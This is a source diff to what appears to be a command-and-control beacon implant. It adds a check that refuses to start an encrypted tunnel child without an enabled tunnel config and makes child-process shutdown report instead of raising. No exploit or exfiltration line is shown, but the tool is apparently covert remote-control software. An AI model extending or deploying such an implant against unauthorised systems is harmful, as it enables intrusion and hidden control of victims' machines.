@@ -2787,6 +2787,34 @@ def tunnel_config_problem(config) -> Optional[str]:
     return None
 
 
+def tunnel_mode_problem(config) -> Optional[str]:
+    """Why this config cannot be *run* as a tunnel endpoint, or None.
+
+    The question `tunnel_config_problem` asks the other way round. That
+    one answers None for a config with no tunnel, because most builds
+    have none and demanding a PSK of those would break them. Here
+    something has been asked to *be* the endpoint -- the child started by
+    `Beacon._exec_tunnel`, or the parent about to start it -- so an
+    absent, non-dict or disabled block is the problem rather than the
+    ordinary case.
+
+    One predicate for both ends on purpose. The parent refuses before it
+    spawns, so the operator gets the diagnosis instead of a bare exit
+    code; the child refuses in its bootstrap, because a build can be
+    launched by hand or by a systemd unit with no parent to have checked.
+    Two spellings of the same rule would be the parent and the child
+    disagreeing about whether a build has a tunnel.
+    """
+    c2 = config.get("c2") if isinstance(config, dict) else None
+    tunnel = c2.get("tunnel") if isinstance(c2, dict) else None
+    if not isinstance(tunnel, dict) or not tunnel.get("enabled"):
+        return ("this build carries no enabled c2.tunnel block: there is "
+                "no server, port, public_key or psk to dial with, so it "
+                "cannot run the tunnel endpoint. Generate the build with "
+                "the tunnel enabled.")
+    return tunnel_config_problem(config)
+
+
 class _TunnelChannel(object):
     """The endpoint's command channel: its socket, Noise session and lock.
 
@@ -3859,6 +3887,11 @@ class Beacon:
         # check-in can confirm a stop and report a crash.
         self._tunnel_proc: Optional[subprocess.Popen] = None
         self._tunnel_origin = ""
+        # Retained so `tunnel start` can refuse before it spawns. The
+        # child's own refusal goes to a stderr this process sends to
+        # DEVNULL, so without this the operator's whole diagnosis is
+        # `exit_code: 1` at the next check-in.
+        self._tunnel_cfg = c2.get("tunnel")
         # `_exec_tunnel` runs on the beacon thread and `stop` on whichever
         # thread owns the process, so the two meet over this.
         self._tunnel_lock = threading.Lock()
@@ -5784,6 +5817,18 @@ class Beacon:
                 return ("Tunnel already running: pid %d (one child per "
                         "beacon; stop it before starting another)"
                         % proc.pid)
+            # Refused here rather than by the child. The child's own
+            # bootstrap refuses too -- a build can be launched by hand or
+            # by a systemd unit with no parent -- but its stderr is
+            # DEVNULL, so a child is the one way the operator cannot be
+            # told why. The most likely case by far is a build generated
+            # before the generator learned to bake a tunnel block, and
+            # that currently reaches them as `exit_code: 1` and nothing
+            # else. Same predicate as the bootstrap's, wrapped in the
+            # config shape it reads.
+            problem = tunnel_mode_problem({"c2": {"tunnel": self._tunnel_cfg}})
+            if problem:
+                return "[error] Not starting a tunnel child: %s" % problem
             try:
                 source, origin = self._tunnel_source()
             except (OSError, RuntimeError) as exc:
@@ -5825,10 +5870,9 @@ class Beacon:
                 failure = "its source could not be written: %s" % exc
             if failure is not None:
                 child.kill()
-                child.wait(timeout=_TUNNEL_CHILD_STOP_TIMEOUT)
                 return ("[error] The tunnel child was given no source and "
-                        "has been killed: %s (exit %s)"
-                        % (failure, child.returncode))
+                        "has been killed: %s (%s)"
+                        % (failure, self._child_ending(child)[1]))
 
             self._tunnel_proc = child
             self._tunnel_origin = origin
@@ -5884,6 +5928,28 @@ class Beacon:
                     % (len(source), _TUNNEL_SOURCE_TIMEOUT))
         return trouble[0] if trouble else None
 
+    @staticmethod
+    def _child_ending(proc) -> Tuple[Optional[int], str]:
+        """Wait for a signalled child: its exit code, and how to say it.
+
+        Never raises, which is the point. `wait` raising
+        `subprocess.TimeoutExpired` out of `_tunnel_start` would reach
+        the operator as `[exception: ...]` from `_process_tasking`'s
+        catch-all with no child recorded, and out of `_tunnel_stop` it
+        would abort the rest of `Beacon.stop` before it had finished. A
+        child that has been killed and is still there is stuck in the
+        kernel and there is nothing further to try, so it is reported
+        rather than raised -- and the residue it leaves is named, because
+        "nothing is leaked" would not be true of it.
+        """
+        try:
+            code = proc.wait(timeout=_TUNNEL_CHILD_STOP_TIMEOUT)
+        except subprocess.TimeoutExpired:
+            return None, ("pid %d has not gone within %.0fs, so it is stuck "
+                          "in the kernel and unreaped"
+                          % (proc.pid, _TUNNEL_CHILD_STOP_TIMEOUT))
+        return code, "exit %s" % code
+
     def _tunnel_stop(self) -> str:
         """Stop the tunnel child. The record of it outlives it.
 
@@ -5891,6 +5957,11 @@ class Beacon:
         check-in confirms it: a beacon that forgot the child would report
         nothing, which is indistinguishable from a stop that never
         happened.
+
+        Both waits go through `_child_ending` and neither calls `wait`
+        itself. A `subprocess.TimeoutExpired` out of here would abort the
+        rest of `Beacon.stop` before it had finished, and reach an
+        operator as `[exception: ...]` from the tasking catch-all.
         """
         with self._tunnel_lock:
             proc = self._tunnel_proc
@@ -5902,15 +5973,21 @@ class Beacon:
                 return ("No tunnel child is running: pid %d had already "
                         "exited with %s" % (proc.pid, code))
             proc.terminate()
-            try:
-                code = proc.wait(timeout=_TUNNEL_CHILD_STOP_TIMEOUT)
-            except subprocess.TimeoutExpired:
+            code, ending = self._child_ending(proc)
+            if code is None:
+                # It did not go when asked.
                 proc.kill()
-                code = proc.wait(timeout=_TUNNEL_CHILD_STOP_TIMEOUT)
+                code, ending = self._child_ending(proc)
+                if code is None:
+                    logger.warning("Tunnel child pid %d survived a kill",
+                                   proc.pid)
+                    return ("[error] The tunnel child could not be stopped: "
+                            "it ignored a terminate and then a kill, and %s"
+                            % ending)
                 logger.warning("Tunnel child pid %d ignored a terminate and "
                                "was killed", proc.pid)
                 return ("Tunnel stopped: pid %d ignored a terminate and was "
-                        "killed (exit %s)" % (proc.pid, code))
+                        "killed (%s)" % (proc.pid, ending))
             logger.info("Tunnel child stopped: pid %d, exit %s", proc.pid, code)
             return "Tunnel stopped: pid %d, exit %s" % (proc.pid, code)
 
